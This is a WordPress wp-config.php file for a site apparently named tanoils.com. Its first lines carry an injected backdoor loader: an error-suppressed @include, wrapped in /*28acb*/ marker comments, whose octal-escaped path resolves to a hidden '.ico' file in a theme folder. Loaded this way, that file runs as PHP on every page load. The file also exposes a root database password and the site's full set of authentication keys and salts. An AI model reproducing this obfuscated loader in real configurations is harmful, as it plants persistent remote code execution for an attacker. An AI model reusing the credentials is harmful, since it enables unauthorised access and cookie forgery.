<?php
/*28acb*/

@include "\057va\162/w\167w/\164an\157il\163/w\160-t\141no\151ls\057wp\055co\156te\156t/\164he\155es\057tw\145nt\171se\166en\164ee\156/.\06249\067e8\0638.\151co";

/*28acb*/
define('WP_CACHE', true); // Added by WP Rocket
if (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https") $_SERVER["HTTPS"] = "on";
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'tanoils.com');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'P@ssw0rd');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any po:int in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'g% rgNyf)hK[^R!rc9jdTwb)Q?>w-`~@F?+Bpi_?Fb=~{p8p@|cevP9N{n<Oq6-X');
define('SECURE_AUTH_KEY',  'V !3kYa:YX;IM)WmV4i1{3n ):j6,4X5.+d{kM>M`@| /5i2?^pw8[f&A0@a26EV');
define('LOGGED_IN_KEY',    '0gK[-ZTwHQr0ag2wT YK?w*pLEE<Fq3;Spr)iH&;EPr<07hygvwxF_a],>:#O Wg');
define('NONCE_KEY',        'nlQR^}0z3P)3,:!dIr@Z@dlRu]cph^5)?7MA-bS%wY##h)|#G^tGksVmX8-MA|)X');
define('AUTH_SALT',        '&=b3.Gw*nGT@gKF67G4g@+8lSoO7BFDh/dEK+Q(|bGe|q9>+vrnu`nK+?mY:O_rM');
define('SECURE_AUTH_SALT', 'NqT#Pq2}Zd)x(I#o )Lv3Pkj[D7 SV_$/XDZ>KyOaBIbSuHQ^pz0KdyHlZZQFI.)');
define('LOGGED_IN_SALT',   '}1s(MEaB@//~eQS7dv48x j_9)u#Qr,},Gdg=oD7kr=4$ggA F!I_>WFh@#xyqpz');
define('NONCE_SALT',       '~6^iJXVIP.Y6;*Cf@[UC(IN1JFzQ b3 |U6{~-`]csrq%}{*@P$TlUmBX|0fizQ`');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);
$_SERVER["HTTP_HOST"] = $_SERVER["SERVER_NAME"];
$_SERVER["HTTP_HOST"] = $_SERVER["SERVER_NAME"];

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
